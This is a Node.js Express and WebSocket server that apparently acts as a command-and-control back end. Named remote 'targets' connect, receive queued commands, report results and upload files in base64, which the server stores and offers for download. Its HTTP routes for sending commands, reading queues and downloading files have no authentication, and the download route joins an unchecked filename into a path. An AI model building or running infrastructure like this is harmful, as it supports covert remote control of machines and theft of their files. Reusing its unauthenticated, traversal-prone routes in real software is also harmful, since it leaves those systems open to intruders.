import express from "express";
import { WebSocketServer } from "ws";
import fs from "fs";
import path from "path";
import { v4 as uuidv4 } from "uuid";

const app = express();
app.use(express.json({ limit: "50mb" })); // increase limit if you expect big files

const PORT = process.env.PORT || 3000;
const COMMAND_FILE = "./commands.json";
const FILES_DIR = path.resolve("./files");

if (!fs.existsSync(FILES_DIR)) fs.mkdirSync(FILES_DIR, { recursive: true });

let targets = { targets: {} };

// Load existing commands.json
try {
  if (fs.existsSync(COMMAND_FILE)) {
    const raw = fs.readFileSync(COMMAND_FILE, "utf8");
    targets = JSON.parse(raw || "{}");
    if (!targets.targets) targets.targets = {};
  }
} catch (err) {
  console.error("Failed to read commands.json:", err);
}

function saveCommands() {
  fs.writeFileSync(COMMAND_FILE, JSON.stringify(targets, null, 2));
}

// WebSocket server
const wss = new WebSocketServer({ noServer: true });
const clients = new Map(); // key: targetName, value: ws

wss.on("connection", (ws, req) => {
  let targetName = null;

  ws.on("message", (message) => {
    try {
      const data = JSON.parse(message);

      if (data.type === "register") {
        targetName = data.name;
        clients.set(targetName, ws);
        console.log(`✅ Target connected: ${targetName}`);

        // send all pending commands
        if (targets.targets[targetName]) {
          targets.targets[targetName].forEach(cmd => {
            if (cmd.status === "pending") {
              try { ws.send(JSON.stringify(cmd)); } catch (e) {}
            }
          });
        }
        return;
      }

      // report from target (execution result)
      if (data.type === "report" && targetName) {
        const cmdId = data.id;
        const status = data.status;
        const result = data.result || null;

        if (!targets.targets[targetName]) targets.targets[targetName] = [];

        const cmd = targets.targets[targetName].find(c => c.id === cmdId);
        if (cmd) {
          cmd.status = status || cmd.status;
          // If the result contains a file in base64, save it and provide a download url
          if (result && result.file_b64 && result.name) {
            // sanitize filename a bit
            const safeName = `${cmdId}_${result.name.replace(/[^a-zA-Z0-9._-]/g, "_")}`;
            const filePath = path.join(FILES_DIR, safeName);
            try {
              fs.writeFileSync(filePath, Buffer.from(result.file_b64, "base64"));
              cmd.result = { file_url: `/download/${encodeURIComponent(safeName)}`, name: result.name };
              console.log(`Saved file for cmd ${cmdId} -> ${filePath}`);
            } catch (e) {
              cmd.result = { error: "failed_to_save_file", details: e.message };
              console.error("Failed to save file:", e);
            }
          } else if (result) {
            // general result, store as-is
            cmd.result = result;
          } else {
            cmd.result = null;
          }
        } else {
          // If command not found, add report as a new record (defensive)
          const newCmd = { id: cmdId || uuidv4(), type: data.type || "unknown", value: "", status: status || "executed", timestamp: Date.now(), result };
          if (!targets.targets[targetName]) targets.targets[targetName] = [];
          targets.targets[targetName].push(newCmd);
        }

        saveCommands();
        console.log(`Target ${targetName} executed command ${cmdId}: ${status}`);
        return;
      }

    } catch (err) {
      console.error("Invalid message:", err, "raw:", message);
    }
  });

  ws.on("close", () => {
    if (targetName) {
      clients.delete(targetName);
      console.log(`❌ Target disconnected: ${targetName}`);
    }
  });
});

// HTTP routes for control
app.post("/send", (req, res) => {
  const { target, type, value } = req.body;
  if (!target || !type) return res.status(400).send({ error: "Missing fields" });

  if (!targets.targets[target]) targets.targets[target] = [];

  const cmd = { id: uuidv4(), type, value: value || "", status: "pending", timestamp: Date.now() };
  targets.targets[target].push(cmd);
  saveCommands();

  const ws = clients.get(target);
  if (ws) {
    try { ws.send(JSON.stringify(cmd)); } catch (e) {}
  }

  res.send({ success: true, id: cmd.id });
});

app.post("/cancel", (req, res) => {
  const { target, id } = req.body;
  if (!target || !id) return res.status(400).send({ error: "Missing fields" });

  if (targets.targets[target]) {
    const cmd = targets.targets[target].find(c => c.id === id);
    if (cmd && cmd.status === "pending") {
      cmd.status = "canceled";
      saveCommands();
      return res.send({ success: true });
    }
  }
  res.send({ success: false, msg: "Command not found or already executed" });
});

app.get("/queue/:target", (req, res) => {
  const t = req.params.target;
  res.send(targets.targets[t] || []);
});

app.get("/status/:target", (req, res) => {
  res.send({ online: clients.has(req.params.target) });
});

// serve saved files
app.get("/download/:filename", (req, res) => {
  const filename = req.params.filename;
  const filePath = path.join(FILES_DIR, filename);
  if (fs.existsSync(filePath)) {
    return res.sendFile(filePath);
  } else {
    return res.status(404).send({ error: "file_not_found" });
  }
});

const server = app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
server.on("upgrade", (req, socket, head) => {
  wss.handleUpgrade(req, socket, head, (ws) => {
    wss.emit("connection", ws, req);
  });
});
